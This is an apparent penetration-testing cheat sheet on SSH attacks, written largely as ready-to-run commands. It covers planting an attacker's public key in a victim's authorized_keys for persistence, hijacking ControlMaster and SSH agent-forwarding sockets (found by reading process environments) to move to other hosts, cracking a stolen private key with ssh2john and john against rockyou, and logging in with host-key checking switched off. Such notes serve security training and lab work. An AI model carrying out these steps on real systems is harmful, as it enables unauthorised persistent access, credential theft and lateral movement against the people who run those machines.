---
description: SSH Persistence and Hijacking
---

# SSH

## Peristence

if writable on victim

\~/.ssh/authorized\_keys

### Create keys on attacker box

```
ssh-keygen
```

### Copy id\_rsa.pub key to victim

```
echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/kali/.ssh/authorized_keys
```

```
ssh-copy-id "user@hostname.example.com -p <port-number>"
```

```
cat ~/.ssh/id_rsa.pub | ssh <user>@<hostname> 'cat >> .ssh/authorized_keys
```

Now you can SSH without a passphrase

```
ssh kali@linuxvictim
```

## SSH Agent-Forwarding

Looking for socket files

* Use existing connection to get to another machine
* modification of \~/.ssh/config
* any new connections will try to use an existing control socket



* need to set permissions on the config file and create the controlmaster folder

```
chmod 644 ~/.ssh/config && mkdir ~/.ssh/controlmaster
```

* Create keys

```
ssh-keygen
```

* public keys need to be copied to the other boxes if possible

```
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller  
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim
```

* Must modify local .ssh/config file to enable forward agent

```
echo "ForwardAgent yes" >> .ssh/config
```

* The intermediate server / controller must have AllowAgentForwarding in sshd config enabled

```
grep AllowAgentForwarding /etc/ssh/sshd_config
```

* must enable the ssh agent on our Kali box

```
eval 'ssh-agent'
```

* now we must add our keys to the ssh agent

```
ssh-add
```

* ssh into the controller as offsec, then ssh into the linuxvictim as offsec and exit the linux victim session

Controlmaster config

```

Host *  
ControlPath ~/.ssh/controlmaster/%r@%h:%p  
ControlMaster auto  
ControlPersist 10m
ForwardAgent yes
```

* need to set permissions on the config file and create the controlmaster folder

```
chmod 644 ~/.ssh/config  
mkdir ~/.ssh/controlmaster
```

* if there happens to be a session it can be seen in the controlmaster folder created

```

ls -al ~/.ssh/controlmaster/
```

* If there is an entry you can ssh to that box by specifying ssh -S

```
ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim
```

### Enumeration of sockets

* Looking for the "SSH\_AUTH\_SOCK entry"

```
ps -aux | grep ssh

pstree -p offsec | grep ssh\

cat /proc/[pid]/environ
```

### Look for the last line "SSH\_AUTH\_SOCK"

```
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380
```

```
ssh-add -l
```

```
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380
```

```
ssh offsec@linuxvictim
```

## Cracking SSH Keys

### Copy SSH key to Kali

```
python /usr/share/john/ssh2john.py svuser.key > svuser.hash
```

gunzip /usr/share/wordlists/rockyou.gz (if not already done)

```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash
```

Use cracked key to laterally move

```
ssh -i ./svuser.key -o StrictHostKeyChecking=no svuser@controller
```
